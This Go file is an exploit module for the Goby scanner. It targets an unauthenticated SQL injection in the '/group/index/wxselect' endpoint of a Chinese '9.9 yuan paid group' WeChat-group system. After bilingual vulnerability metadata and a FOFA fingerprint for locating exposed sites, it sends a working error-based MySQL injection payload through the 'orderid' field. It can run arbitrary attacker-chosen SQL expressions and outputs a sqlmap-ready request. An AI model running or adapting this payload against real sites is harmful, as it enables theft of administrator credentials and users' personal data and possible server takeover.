package exploits

import (
	"crypto/md5"
	"encoding/hex"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "9.9 yuan paid group system /group/index/wxselect SQL Injection Vulnerability",
    "Description": "<p>The 9.9 yuan paid group entry system is a new way of community management. Users can join a specific WeChat group by paying 9.9 yuan and enjoy the services or resources provided by the group. This model is usually used in communities such as knowledge sharing, resource downloading, and professional exchanges. By setting thresholds to screen members, the professionalism and interaction quality of the group are improved. The wxselect interface of the 9.9 yuan paid group entry system has a SQL injection vulnerability Q. In addition to being able to use the SQL injection vulnerability to obtain information in the database (for example, the administrator's backend password, the user's personal information of the site), unauthenticated remote attackers can even write Trojans to the server with high permissions to further obtain server system permissions.</p>",
    "Product": "9.9 yuan paid entry group system",
    "Homepage": "https://manduoke.com/?type=productinfo&id=107",
    "DisclosureDate": "2024-07-16",
    "PostTime": "2024-11-01",
    "Author": "2826161446@qq.com",
    "FofaQuery": "body=\"/website/index/login.html\" && body=\"template/layuiadmin/layui/css/layui.css\"",
    "GobyQuery": "body=\"/website/index/login.html\" && body=\"template/layuiadmin/layui/css/layui.css\"",
    "Level": "2",
    "Impact": "<p>The wxselect interface of the 9.9 yuan paid group entry system has a SQL injection vulnerability Q. In addition to being able to use the SQL injection vulnerability to obtain information in the database (for example, the administrator's backend password, the user's personal information of the site), unauthenticated remote attackers can even write Trojans to the server with high permissions to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. Please pay attention to official information and update to the latest version: <a href=\"https://manduoke.com/?type=productinfo&amp;id=107\">https://manduoke.com/?type=productinfo&amp;id=107</a> </p><p>2. Deploy a Web application firewall to monitor database operations. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/qq_41904294/article/details/142363137"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "version()",
            "show": "attackType=custom"
        },
        {
            "name": "default",
            "type": "select",
            "value": "version(),user(),database()",
            "show": "attackType=default"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "九块九付费进群系统 /group/index/wxselect SQL 注入漏洞",
            "Product": "九块九付费进群系统",
            "Description": "<p>九块九付费进群系统是一种新的社群管理方式，用户通过支付9.9元人民币即可加入特定的微信群，享受群内提供的服务或资源。这种模式通常用于知识分享、资源下载、专业交流等社群，通过设置门槛来筛选成员，提高群组的专业性和互动质量。九块九付费进群系统 wxselect 接口存在 SQL注入漏洞Q，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、请及时关注官方信息，更新到最新版本：<a href=\"https://manduoke.com/?type=productinfo&amp;id=107\">https://manduoke.com/?type=productinfo&amp;id=107</a></p><p>2、部署Web应⽤防⽕墙，对数据库操作进⾏监控。&nbsp;&nbsp;<br></p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>九块九付费进群系统 wxselect 接口存在 SQL注入漏洞Q，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "9.9 yuan paid group system /group/index/wxselect SQL Injection Vulnerability",
            "Product": "9.9 yuan paid entry group system",
            "Description": "<p>The 9.9 yuan paid group entry system is a new way of community management. Users can join a specific WeChat group by paying 9.9 yuan and enjoy the services or resources provided by the group. This model is usually used in communities such as knowledge sharing, resource downloading, and professional exchanges. By setting thresholds to screen members, the professionalism and interaction quality of the group are improved. The wxselect interface of the 9.9 yuan paid group entry system has a SQL injection vulnerability Q. In addition to being able to use the SQL injection vulnerability to obtain information in the database (for example, the administrator's backend password, the user's personal information of the site), unauthenticated remote attackers can even write Trojans to the server with high permissions to further obtain server system permissions.<br></p>",
            "Recommendation": "<p>1. Please pay attention to official information and update to the latest version: <a href=\"https://manduoke.com/?type=productinfo&amp;id=107\">https://manduoke.com/?type=productinfo&amp;id=107</a>&nbsp;</p><p>2. Deploy a Web application firewall to monitor database operations.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>The wxselect interface of the 9.9 yuan paid group entry system has a SQL injection vulnerability Q. In addition to being able to use the SQL injection vulnerability to obtain information in the database (for example, the administrator's backend password, the user's personal information of the site), unauthenticated remote attackers can even write Trojans to the server with high permissions to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9968"
}`

	setSqlPayloadtXLgfmgedj := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulURL string, err error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string, head map[string]string) (*httpclient.HttpResponse, error) {
			postRequest := httpclient.NewPostRequestConfig(":" + hostInfo.Port + url)
			//log.Println(hostInfo.HostInfo)
			//postRequest := httpclient.NewRequestConfig("POST", "/group/index/wxselect")
			//postRequest.URI = hostInfo.HostInfo
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = payload
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			//fixUrl := httpclient.NewFixUrl(hostInfo)
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		headers := map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
		}

		urlPost := "/group/index/wxselect"
		rawpayload := fmt.Sprintf("orderid=') AND GTID_SUBSET(CONCAT((MID((IFNULL(CAST(%s AS NCHAR),0x7e)),1,190))),5417)-- ylIU", sql)

		resp, err = setPostRequest(hostInfo, urlPost, rawpayload, headers)

		if resp == nil {
			return nil, "", errors.New("Fail")
		}

		if err != nil || resp.StatusCode != 500 {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulURL = "/group/index/wxselect"

		return resp, vulURL, nil

	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			MD5Reslut := rand.Intn(99999)
			MD5ResultStr := fmt.Sprintf("%d", MD5Reslut)
			//将MD5Hash进行md5加密
			MD5Hash := md5.New()
			MD5Hash.Write([]byte(MD5ResultStr))
			content := hex.EncodeToString(MD5Hash.Sum(nil))

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := "MD5(" + MD5ResultStr + ")"

			sendPayload := setSqlPayloadtXLgfmgedj
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `specification '([^"]+)`
			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			output, err := makeRegular(resp.RawBody, regular)

			if !strings.Contains(output, content) {
				return false
			}

			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "POST /group/index/wxselect HTTP/1.1\nHost: " + expResult.HostInfo.HostInfo + "\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0\nContent-Type: application/x-www-form-urlencoded\n \norderid==1*}"
			// 3.配置正则语句，从响应包中提取出数据
			//regular := `qjkqq([\s\S]*?)qjxjq`
			regular := `specification '([^"]+)'`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadtXLgfmgedj
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "default" {
				sql := goutils.B2S(ss.Params["default"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "custom" {
				sql := goutils.B2S(ss.Params["custom"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
